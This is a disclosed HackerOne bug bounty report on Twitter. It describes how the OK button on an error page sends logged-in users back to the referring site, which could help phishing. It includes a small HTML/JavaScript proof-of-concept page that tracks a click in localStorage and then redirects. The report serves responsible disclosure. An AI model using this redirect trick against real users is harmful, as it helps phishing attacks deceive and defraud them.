# Accepting error message on twitter sends you to attacker site

## Report Details
- **Report ID**: 781673
- **URL**: https://hackerone.com/reports/781673
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-23T17:21:40.684Z
- **Disclosed**: 2020-03-13T18:14:22.046Z

## Reporter
- **Username**: safehacker_2715
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** Accepting error message on twitter sends you back to attacker site. 

**Description:** 
 1. The link https://twitter.com/i/flow shows up an error message with an OK button
 2. When you are not logged in, clicking in that OK button takes you back to twitter.com
 3. But if you open that link when you are logged in, clicking on OK takes you to the page from where you are routed to twitter.
 4. This simplifies phishing attack where an attacker can take user to malicious page on clicking OK button on twitter.

PS: This may not be an Open redirect using URL but a redirection that could simplify phishing attacks (CWE-601)

## Steps To Reproduce:

  1. Save  the following code as HTML file
  2. Login to twitter and in other tab of same browser open the HTML file
  3. Click on the link "Click here"
  4. You are then taken to twitter and an error message is shown
  5. Click OK
  6. You are then reidrected to attackers site (Here in PoC I have used "https://hackerone.com/twitter")


```
<html>
<body>
<h1> This is hacker's site</h1>
<a href="https://twitter.com/i/flow" onClick="userClicked()">Click here</a> //This may also be made an auto-redirection to twitter from attacker site

</body>
<script>

function userClicked(){
localStorage.setItem("ClickCount", 1);  //Setting up a value in local storage to detected user click
}


if(localStorage.getItem("ClickCount")==1)
   {
      localStorage.setItem("ClickCount", 0); 
      if(localStorage.getItem("ClickCount")==0) 
         {
            window.location.replace("https://hackerone.com/twitter");  //This can any attacker controlled website
         }
   }
   
   

</script>
</html>
```

## Impact

This simplifies phishing attack where an attacker can take user to malicious page on clicking OK button on twitter
Possible fix might be sending the user back to twitter.com on click of OK

## Attachments
No attachments
